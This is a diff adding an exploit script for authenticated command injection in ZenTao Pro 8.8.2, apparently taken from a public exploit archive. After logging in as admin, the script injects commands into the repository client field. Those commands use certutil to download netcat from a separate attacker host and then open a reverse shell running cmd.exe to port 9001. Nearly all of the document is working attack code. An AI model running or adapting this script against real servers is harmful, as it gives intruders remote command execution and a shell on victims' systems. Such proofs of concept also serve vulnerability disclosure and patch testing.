@@ -1,0 +1,104 @@
+# Exploit Title: ZenTao Pro 8.8.2 - Command Injection
+# Date: 2020-07-01
+# Exploit Author: Daniel Monzón & Melvin Boers
+# Vendor Homepage: https://www.zentao.pm/
+# Version: 8.8.2
+# Tested on: Windows 10 / WampServer
+# Other versions like pro or enterprise edition could be affected aswell
+# Netcat is needed to use this exploit
+
+
+import requests
+import hashlib
+import urllib.parse
+
+
+host = 'http://192.168.223.132'
+username = 'admin'
+password = 'Test123!@#'
+name = 'Test2'
+command = 'certutil.exe+-urlcache+-f+-split+http%3A%2F%2F192.168.223.131%2Fnc.exe+C%3A%5Cbad.exe+%26%26'
+command2 = 'C:\\bad.exe  192.168.223.131 9001 -e cmd.exe &&'
+git_path = 'C%3A%5CProgramData'
+
+
+
+x = requests.session() # Create a session, as needed because we need admin rights.
+
+
+
+def sign_in(url, username, password):
+    password = hashlib.md5(password.encode('utf-8')).hexdigest() # We need to md5 encode the password in order to sign in
+    proxy = {'http':'127.0.0.1:8080', 'https':'127.0.0.1:8080'} # Just for debugging phase
+    credentials = {'account' : username, 'password' : password} # The credentials we need
+    path = url + '/zentao/user-login.html' # URL + path
+    x.post(path, data=credentials, proxies=proxy, verify=False) # Send the post request to sign in
+    return '[*] We are signed in!'
+
+
+def go_to_repo(url):
+	path = url + '/zentao/repo-browse.html'
+	x.get(path, verify=False)
+
+	print('[*] Getting to repo path')
+
+
+
+def create_repo(url, name, command):
+	headers = {'Accept':'application/json, text/javascript, */*; q=0.01',
+	           'Accept-Encoding':'gzip, deflate',
+	           'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
+	           'X-Requested-With': 'XMLHttpRequest', 
+	           'Origin':'http://192.168.223.132',
+	           'Referer':'http://192.168.223.132/pro/repo-create.html', 
+	           'User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0',
+	           'Accept-Language':'en-US,en;q=0.5'}
+
+	cookies = {'ajax_lastNext':'on',
+	           'windowWidth':'1846',
+	           'windowHeight':'790'}
+
+	path = url + '/zentao/repo-create.html'
+	parameters = 'SCM=Git&name=' + name + '&path=' + git_path + '&encoding=utf-8&client=' + command
+	x.post(path, data=parameters, headers=headers, cookies=cookies, verify=False)
+
+	print('[*] Creating the repo')
+
+
+def get_shell(url, name, command):
+	headers = {'Accept':'application/json, text/javascript, */*; q=0.01',
+	           'Accept-Encoding':'gzip, deflate',
+	           'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
+	           'X-Requested-With': 'XMLHttpRequest', 
+	           'Origin':'http://192.168.223.132',
+	           'Referer':'http://192.168.223.132/pro/repo-create.html', 
+	           'User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0',
+	           'Accept-Language':'en-US,en;q=0.5'}
+
+	cookies = {'ajax_lastNext':'on',
+	           'windowWidth':'1846',
+	           'windowHeight':'790'}
+
+	path = url + '/zentao/repo-create.html'
+	parameters = 'SCM=Git&name=' + name + '&path=' + git_path + '&encoding=utf-8&client=' + command2
+	x.post(path, data=parameters, headers=headers, cookies=cookies, verify=False)
+
+	print('[*] Check your netcat listener!')
+
+
+def main():
+	switch = True
+
+	if switch:
+            sign_in(host, username, password)
+            if switch:
+                go_to_repo(host)
+                if switch:
+                    create_repo(host, name, command)
+                    if switch:
+                    	get_shell(host, name, command2)
+                    	switch = False
+
+
+if __name__ == "__main__":
+	main()
